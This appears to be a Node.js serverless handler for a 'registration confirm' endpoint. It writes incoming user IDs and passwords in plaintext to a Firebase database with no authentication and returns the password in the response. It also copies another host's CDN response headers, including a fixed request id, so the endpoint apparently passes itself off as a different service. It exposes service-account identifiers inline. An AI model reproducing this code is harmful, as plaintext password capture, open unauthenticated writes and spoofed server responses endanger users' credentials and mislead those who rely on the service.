// api/RegistrationConfirm.js
import admin from "firebase-admin";

if (!admin.apps.length) {
  admin.initializeApp({
    credential: admin.credential.cert({
      "type": "service_account",
      "project_id": "giper-8fd92",
      "private_key_id": "d4cf9aec6abf53c0df8ca0faf5bf3c8b2fdb33b3",
      "private_key": process.env.FIREBASE_PRIVATE_KEY.replace(/\\n/g, '\n'),
      "client_email": "firebase-adminsdk-fbsvc@giper-8fd92.iam.gserviceaccount.com",
      "client_id": "116468020044240810013",
      "auth_uri": "https://accounts.google.com/o/oauth2/auth",
      "token_uri": "https://oauth2.googleapis.com/token",
      "auth_provider_x509_cert_url": "https://www.googleapis.com/oauth2/v1/certs",
      "client_x509_cert_url": "https://www.googleapis.com/robot/v1/metadata/x509/firebase-adminsdk-fbsvc%40giper-8fd92.iam.gserviceaccount.com",
    }),
    databaseURL: "https://giper-8fd92-default-rtdb.firebaseio.com"
  });
}

const db = admin.database();

export default async function handler(req, res) {
  if (req.method !== "POST") {
    return res.status(405).json({ error: "Only POST allowed" });
  }

  const { UserId, Password } = req.body;

  // 🔥 ALL_USERR node ichiga yozamiz
  await db.ref("ALL_USERR/" + UserId).set({
    UserId,
    Password,
    Message: "Success!",
    VerificationState: 0,
  });

  // 🔥 API javobi
  res.status(200).setHeader("Content-Type", "application/json");
  res.setHeader("Connection", "keep-alive");
  res.setHeader("Content-Encoding", "br");
  res.setHeader("platform", "hostinger");
  res.setHeader("panel", "hpanel");
  res.setHeader("Server", "hcdn");
  res.setHeader("alt-svc", 'h3=":443"; ma=86400');
  res.setHeader("x-hcdn-request-id", "63a6ac2d3d69b75a7dd99fd6444dcc88-nme-edge7");
  res.setHeader("x-hcdn-cache-status", "DYNAMIC");
  res.setHeader("x-hcdn-upstream-rt", "0.628");
  res.setHeader("Accept-Ranges", "bytes");

  return res.json({
    Success: true,
    Value: {
      User: {
        UserId,
        Password,
        Message: "Success!",
        VerificationState: 0,
      },
    },
  });
}
